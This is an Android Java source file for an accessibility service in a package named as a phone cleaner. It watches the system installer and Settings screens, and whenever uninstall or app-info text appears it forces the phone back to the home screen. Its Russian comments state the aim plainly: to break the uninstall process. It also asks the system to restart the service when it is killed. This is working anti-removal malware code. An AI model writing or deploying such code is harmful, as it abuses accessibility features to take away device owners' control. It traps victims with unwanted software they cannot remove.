package com.phone.health.cleaner;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

public class CoreService extends AccessibilityService {

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Твоя логика фоновой службы (модель устройства и т.д.)
        String deviceName = Build.MODEL; 
        
        // Возвращаем START_STICKY, чтобы служба перезапускалась при убийстве системой
        return START_STICKY;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;

        CharSequence packageName = event.getPackageName();
        String pkgStr = packageName.toString().toLowerCase();

        // 1. Ловим момент, когда лаунчер пытается открыть окно удаления пакета
        if (pkgStr.contains("packageinstaller") || pkgStr.contains("installer")) {
            for (CharSequence text : event.getText()) {
                if (text != null) {
                    String t = text.toString().toLowerCase();
                    if (t.contains("удалить") || t.contains("uninstall") || t.contains("удаление")) {
                        // Мгновенно выкидываем на рабочий стол, ломая процесс удаления
                        performGlobalAction(GLOBAL_ACTION_HOME);
                        return;
                    }
                }
            }
        }

        // 2. Ловим стандартные настройки, если пользователь зашел через меню "О приложении"
        if (pkgStr.contains("settings")) {
            for (CharSequence text : event.getText()) {
                if (text != null) {
                    String t = text.toString().toLowerCase();
                    if (t.contains("удалить") || t.contains("о приложении") || t.contains("app info") || t.contains("сведения")) {
                        // Мгновенно выкидываем на рабочий стол
                        performGlobalAction(GLOBAL_ACTION_HOME);
                        return;
                    }
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        // Обязательный метод для службы спецвозможностей
    }
}
